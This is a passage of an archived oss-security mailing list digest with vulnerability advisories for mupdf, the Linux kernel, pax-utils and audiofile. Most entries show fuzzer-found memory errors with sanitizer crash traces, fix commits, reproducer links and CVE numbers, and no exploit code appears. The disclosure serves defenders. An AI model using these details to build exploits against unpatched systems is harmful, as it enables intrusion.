-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEpwxVTgxAIcUvTugIo5Klpg50CxAFAli1fYYACgkQo5Klpg50
CxDntA/+IUm8N0T3sPcvR7uZnLbweQv35IbBdC1ntPYHHx/zmuzDPzfUXhSvDSkT
UYVcwHiSdo2t7h8jD7Ctqm3qSovG7wEZU7nfrE778jlPHSYos/godGnuXonF6SLN
EDA80uVH4ePz2/OYkXDhehbKaA+LBcFBxTt6pv92MU2AvHEQaVruyKrXN2RdlQH5
bVzIznJJQWsRJdoKYzyNayZ7TQMVMqcqpbnx5CchvmmY5TZYg7m3qbiVahPTrQz6
EOwlgfPB/6rOaMODxCAAKipeidVPXuRKE/JWFyDdp/2X/74uT5Lt3JK5qBVJEGKM
V+UBGi17vcr19wMrmU9JVQQXFCRfxKuMi7tclMuYAJqMWxpuup6xXLcbvsC0vt4n
2fWOWuQd9+uSbr4QEtv4mdEx3KCmjorax1hnLZXGyEPEKiUHFWfeM9naEAPX18HD
hQJa7m9/a3lM2mz4FGo3+WgspKQlEczJhevw3KCA3CYa4pdKGcf9gbb1QcS3LNea
pe0/FwJ+JXoH5MZ9EerHjZ08bKFNFcDI5JJCtS+L3Z9xx84/kHg7zttbwEp3K386
eMTkk7AOgE6i75y6D0P2TibnZtBTOduuDd8v4Ws/4zByeK6z/QD0AJA/RV1Cw0bn
agoJCoaigfNZpigM/dGMZf/sF9Dt2U/qBWhXgVk583MeODjqpOg=
=zMry
-----END PGP SIGNATURE-----


```

</details>

---

</details>

## mupdf
<details>
<summary><strong>[oss-security] mupdf: mujstest: global-buffer-overflow in main (jstest_main.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1478046452.4479_15834.NdNdNx,U=15170:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `20511243.IiplisyCjp@arcadia`

```
A note outside the blog post:
This issue does not affect any library, but it is only in the mujstest binary.
There aren't known applications which use mujstest, but if you have an 
application or website which relies on mujstest you are invited to apply the 
patch or use the newer package when it will be released. Thanks.

Description:
Mujstest, which is part of mupdf is a scriptable tester for mupdf + js.

A fuzzing revealed a global buffer overflow write.

The complete ASan output:

# mujstest $FILE
=================================================================
==2244==ERROR: AddressSanitizer: global-buffer-overflow on address 
0x0000013c6140 at pc 0x000000473526 bp 0x7fff866f77d0 sp 0x7fff866f6f80
WRITE of size 1181 at 0x0000013c6140 thread T0
    #0 0x473525 in __interceptor_strcpy /var/tmp/portage/sys-devel/llvm-3.8.0-
r3/work/llvm-3.8.0.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:547
    #1 0x4f7910 in main /var/tmp/portage/app-
text/mupdf-1.9a/work/mupdf-1.9a/platform/x11/jstest_main.c:353:6
    #2 0x7f3a6c18661f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #3 0x41ade8 in _init (/usr/bin/mujstest+0x41ade8)

0x0000013c6140 is located 0 bytes to the right of global variable 'filename' 
defined in 'platform/x11/jstest_main.c:15:13' (0x13c5d40) of size 1024
SUMMARY: AddressSanitizer: global-buffer-overflow /var/tmp/portage/sys-
devel/llvm-3.8.0-r3/work/llvm-3.8.0.src/projects/compiler-
rt/lib/asan/asan_interceptors.cc:547 in __interceptor_strcpy
Shadow bytes around the buggy address:
  0x000080270bd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270be0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270bf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270c10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x000080270c20: 00 00 00 00 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9
  0x000080270c30: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x000080270c40: f9 f9 f9 f9 f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9
  0x000080270c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2244==ABORTING

Affected version:
1.9a

Fixed version:
1.10 (not yet released)

Commit fix:
http://git.ghostscript.com/?p=mupdf.git;h=cfe8f35bca61056363368c343be36812abde0a06

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Timeline:
2016-08-04: bug discovered
2016-08-05: bug reported to upstream
2016-09-22: upstream released a patch
2016-09-24: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2016/09/24/mupdf-mujstest-global-buffer-overflow-in-main-jstest_main-c/


-- 
Agostino Sarubbo
Gentoo Linux Developer

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401103.9439_32.Morbo,U=41376:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `4271799.Slv6QYllRs@blackgate`

```
On Sunday 16 October 2016 20:52:34 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2016/09/24/mupdf-mujstest-global-buffer-overflo
> w-in-main-jstest_main-c/

This is CVE-2016-10246

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] mupdf: mujstest: global-buffer-overflow in my_getline (jstest_main.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1478046452.4479_15833.NdNdNx,U=15169:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `11022030.6ZF3cfAM3U@arcadia`

```
A note outside the blog post:
This issue does not affect any library, but it is only in the mujstest binary.
There aren't known applications which use mujstest, but if you have an 
application or website which relies on mujstest you are invited to apply the 
patch or use the newer package when it will be released. Thanks.

Description:
Mujstest, which is part of mupdf is a scriptable tester for mupdf + js.

A fuzzing revealed a global buffer overflow write.

The complete ASan output:

# mujstest $FILE
==1278==ERROR: AddressSanitizer: global-buffer-overflow on address 
0x0000013c7280 at pc 0x0000004fa432 bp 0x7ffea75837d0 sp 0x7ffea75837c8
WRITE of size 1 at 0x0000013c7280 thread T0
    #0 0x4fa431 in my_getline /var/tmp/portage/app-
text/mupdf-1.9a/work/mupdf-1.9a/platform/x11/jstest_main.c:214:5
    #1 0x4fa431 in main /var/tmp/portage/app-
text/mupdf-1.9a/work/mupdf-1.9a/platform/x11/jstest_main.c:335
    #2 0x7fb62229661f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #3 0x41ade8 in _init (/usr/bin/mujstest+0x41ade8)

0x0000013c7280 is located 0 bytes to the right of global variable 
'getline_buffer' defined in 'platform/x11/jstest_main.c:24:13' (0x13c6280) of 
size 4096
SUMMARY: AddressSanitizer: global-buffer-overflow /var/tmp/portage/app-
text/mupdf-1.9a/work/mupdf-1.9a/platform/x11/jstest_main.c:214:5 in my_getline
Shadow bytes around the buggy address:
  0x000080270e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270e10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270e20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270e30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x000080270e40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x000080270e50:[f9]f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x000080270e60: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x000080270e70: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x000080270e80: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x000080270e90: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x000080270ea0: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1278==ABORTING

Affected version:
1.9a

Fixed version:
1.10 (not yet released)

Commit fix:
http://git.ghostscript.com/?p=mupdf.git;h=446097f97b71ce20fa8d1e45e070f2e62676003e

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Timeline:
2016-08-04: bug discovered
2016-08-05: bug reported to upstream
2016-09-22: upstream released a patch
2016-09-24: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2016/09/24/mupdf-mujstest-global-buffer-overflow-in-my_getline-jstest_main-c/


-- 
Agostino Sarubbo
Gentoo Linux Developer

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_31.Morbo,U=41375:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1933450.huz7fftLl8@blackgate`

```
On Sunday 16 October 2016 20:52:31 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2016/09/24/mupdf-mujstest-global-buffer-overflo
> w-in-my_getline-jstest_main-c/

This is CVE-2016-10247

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>

## fix
<details>
<summary><strong>[oss-security] Linux: ip: fix IP_CHECKSUM handling (CVE-2017-6347)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379282.2379_140.Morbo,U=37979:2,S -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170228162309.e22hyhgw4id7dgdn@eldamar.local`

```
Hi

CVE-2017-6347 was assigned by MITRE to the following (via
https://cveform.mitre.org/):

https://git.kernel.org/linus/ca4ef4574f1ee5252e2cd365f8f5d5bafd048f32

> ip: fix IP_CHECKSUM handling
> 
> The skbs processed by ip_cmsg_recv() are not guaranteed to
> be linear e.g. when sending UDP packets over loopback with
> MSGMORE.
> Using csum_partial() on [potentially] the whole skb len
> is dangerous; instead be on the safe side and use skb_checksum().
> 
> Thanks to syzkaller team to detect the issue and provide the
> reproducer.

The issue was introduced in 4.0 by commit ad6f939ab193. The fix as
well backported to 4.9.13.

Regards,
Salvatore

```

</details>

## pax-utils
<details>
<summary><strong>[oss-security] pax-utils: scanelf: out of bounds read in scanelf_file_get_symtabs (scanelf.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_31.NdNdNx,U=7779:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `719404.939885379-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
pax-utils is a set of tools that check files for security relevant properties.

A fuzz on scanelf exposed that the out-of bound read already reported at 
https://blogs.gentoo.org/ago/2017/02/01/pax-utils-scanelf-out-of-bounds-read-in-scanelf_file_get_symtabs-scanelf-c was unfixed.

The complete ASan output:

# scanelf -s '*' -axetrnibSDIYZB $FILE
==1093==ERROR: AddressSanitizer: unknown-crash on address 0x7f4ddab2c3a0 at pc 0x000000524a77 bp 0x7fffcd2bc320 sp 0x7fffcd2bc318
READ of size 4 at 0x7f4ddab2c3a0 thread T0
    #0 0x524a76 in scanelf_file_get_symtabs /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:357:3
    #1 0x514af2 in scanelf_file_sym /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:1282:2
    #2 0x514af2 in scanelf_elfobj /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:1502
    #3 0x5137f8 in scanelf_elf /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:1567:8
    #4 0x5137f8 in scanelf_fileat /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:1634
    #5 0x512d9b in scanelf_dirat /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:1668:10
    #6 0x511d9d in scanelf_dir /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:1718:9
    #7 0x511d9d in parseargs /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:2228
    #8 0x511d9d in main /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:2316
    #9 0x7f4dd9b4e61f in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
    #10 0x419b28 in getenv (/usr/bin/scanelf+0x419b28)

AddressSanitizer can not describe address in more detail (wild memory access suspected).
SUMMARY: AddressSanitizer: unknown-crash /tmp/portage/app-misc/pax-utils-1.2.2/work/pax-utils-1.2.2/scanelf.c:357:3 in scanelf_file_get_symtabs
Shadow bytes around the buggy address:
  0x0fea3b55d820: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d830: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d840: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d850: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d860: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
=>0x0fea3b55d870: fe fe fe fe[fe]fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d880: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d890: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d8a0: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d8b0: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fea3b55d8c0: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1093==ABORTING

Affected version:
1.2.2

Fixed version:
1.2.3 (not released atm)

Commit fix:
https://github.com/gentoo/pax-utils/commit/e577c5b7e230c52e5fc4fa40e4e9014c634b3c1d
https://github.com/gentoo/pax-utils/commit/858939ea6ad63f1acb4ec74bba705c197a67d559

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00169-pax-utils-scanelf-oobread1

Timeline:
2017-02-09: bug discovered and reported to upstream
2017-02-11: upstream realeased a patch
2017-02-25: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/25/pax-utils-scanelf-out-of-bounds-read-in-scanelf_file_get_symtabs-scanelf-c-2

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

</details>

## audiofile
<details>
<summary><strong>[oss-security] audiofile: multiple ubsan crashes</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_65.NdNdNx,U=7813:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `267855.691348331-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered multiple crashes because of undefined behavior.

The complete UBsan output:

# sfconvert @@ out.mp3 format aiff
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/WAVE.cpp:289:14: runtime error: index 256 out of bounds for type 'int16_t [256][2]'
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/WAVE.cpp:290:14: runtime error: index 256 out of bounds for type 'int16_t [256][2]'

Reproducer:
https://github.com/asarubbo/poc/blob/master/00191-audiofile-indexoob

##########################################

# sfconvert @@ out.mp3 format aiff
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/sfconvert.c:327:42: runtime error: signed integer overflow: 65536 * 252936 cannot be represented in type 
'int'

Reproducer:
https://github.com/asarubbo/poc/blob/master/00192-audiofile-signintoverflow-sfconvert

##########################################

# sfconvert @@ out.mp3 format aiff
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/modules/MSADPCM.cpp:115:27: runtime error: signed integer overflow: 5512570 * 409 cannot be represented in 
type 'int'

Reproducer:
https://github.com/asarubbo/poc/blob/master/00193-audiofile-signintoverflow-MSADPCM

##########################################

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
These bugs were discovered by Agostino Sarubbo of Gentoo.

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
These bugs were found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-multiple-ubsan-crashes

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_18.Morbo,U=41364:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `7377432.3LPlIO6s4Q@blackgate`

```
On Sunday 26 February 2017 11:56:31 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-multiple-ubsan-crashes

These are:
CVE-2017-6837
CVE-2017-6838
CVE-2017-6839

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: heap-based buffer overflow in Expand3To4Module::run (SimpleModule.h)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_63.NdNdNx,U=7811:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `773106.230746151-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered an heap overflow.

The complete ASan output:

# sfconvert @@ out.mp3 format aiff
==1731==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7fd325141800 at pc 0x7fd324dab3e7 bp 0x7fff5fd78e20 sp 0x7fff5fd78e18                                                                                                                                       
WRITE of size 4 at 0x7fd325141800 thread T0                                                                                                                                                                                                                                    
    #0 0x7fd324dab3e6 in void Expand3To4Module::run(unsigned char const*, int*, int) 
/tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/SimpleModule.h:268:14                                                                           
    #1 0x7fd324dab3e6 in Expand3To4Module::run(Chunk&, Chunk&) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/SimpleModule.h:241                                                                                                         
    #2 0x7fd324d8105a in afReadFrames /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/data.cpp:222:14                                                                                                                                             
    #3 0x50bbeb in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:340:29                                                                                                                                                 
    #4 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #5 0x7fd323e5678f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
    #6 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                               
0x7fd325141800 is located 0 bytes to the right of 524288-byte region [0x7fd3250c1800,0x7fd325141800)                                                                                                                                                                           
allocated by thread T0 here:                                                                                                                                                                                                                                                   
    #0 0x4d2d08 in malloc /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64                                                                                                                                       
    #1 0x50bb48 in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:327:17                                                                                                                                                 
    #2 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #3 0x7fd323e5678f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
                                                                                                                                                                                                                                                                               
SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/SimpleModule.h:268:14 in void 
Expand3To4Module::run(unsigned char const*, int*, int)                                                 
Shadow bytes around the buggy address:                                                                                                                                                                                                                                         
  0x0ffae4a202b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ffae4a202c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ffae4a202d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ffae4a202e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
  0x0ffae4a202f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                                                                                                                                                                                                              
=>0x0ffae4a20300:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ffae4a20310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ffae4a20320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ffae4a20330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ffae4a20340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
  0x0ffae4a20350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa                                                                                                                                                                                                              
Shadow byte legend (one shadow byte represents 8 application bytes):                                                                                                                                                                                                           
  Addressable:           00                                                                                                                                                                                                                                                    
  Partially addressable: 01 02 03 04 05 06 07                                                                                                                                                                                                                                  
  Heap left redzone:       fa                                                                                                                                                                                                                                                  
  Heap right redzone:      fb                                                                                                                                                                                                                                                  
  Freed heap region:       fd                                                                                                                                                                                                                                                  
  Stack left redzone:      f1                                                                                                                                                                                                                                                  
  Stack mid redzone:       f2                                                                                                                                                                                                                                                  
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1731==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00190-audiofile-heapoverflow-Expand3To4Module-run

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow-in-expand3to4modulerun-simplemodule-h

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_17.Morbo,U=41363:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `2841123.LNQt9J6edE@blackgate`

```
On Sunday 26 February 2017 11:55:48 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow
> -in-expand3to4modulerun-simplemodule-h

This is CVE-2017-6836

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: divide-by-zero in BlockCodec::reset1 (BlockCodec.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_64.NdNdNx,U=7812:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `794245.981236116-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```


Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered a division by zero.

The complete ASan output:

# sfconvert @@ out.mp3 format aiff
==3538==ERROR: AddressSanitizer: FPE on unknown address 0x7f86a8cffe14 (pc 0x7f86a8cffe14 bp 0x7ffe41d2ae00 sp 0x7ffe41d2adf0 T0)                                                                                                                                              
    #0 0x7f86a8cffe13 in BlockCodec::reset1() /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/BlockCodec.cpp:74:61                                                                                                                        
    #1 0x7f86a8d0b794 in ModuleState::reset(_AFfilehandle*, Track*) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/ModuleState.cpp:218:9                                                                                                 
    #2 0x7f86a8d0b794 in ModuleState::setup(_AFfilehandle*, Track*) /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/ModuleState.cpp:190                                                                                                   
    #3 0x7f86a8ced43c in afGetFrameCount /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/format.cpp:205:41                                                                                                                                        
    #4 0x50bb5c in copyaudiodata /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:329:29                                                                                                                                                 
    #5 0x50b050 in main /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/sfcommands/sfconvert.c:248:17                                                                                                                                                          
    #6 0x7f86a7dbe78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                                                                                                     
    #7 0x419f48 in _init (/usr/bin/sfconvert+0x419f48)                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                               
AddressSanitizer can not provide additional info.                                                                                                                                                                                                                              
SUMMARY: AddressSanitizer: FPE /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/BlockCodec.cpp:74:61 in BlockCodec::reset1()                                                                                                               
==3538==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00189-audiofile-fpe-BlockCodec-reset1

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-divide-by-zero-in-blockcodecreset1-blockcodec-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_16.Morbo,U=41362:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `3933984.tAXUzh7mVD@blackgate`

```
On Sunday 26 February 2017 11:55:03 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-divide-by-zero-in-blockcod
> ecreset1-blockcodec-cpp

This is CVE-2017-6835

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: heap-based buffer overflow in ulaw2linear_buf (G711.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_62.NdNdNx,U=7810:2,ST -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `888180.223384069-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz on it discovered an heap overflow.

The complete ASan output:

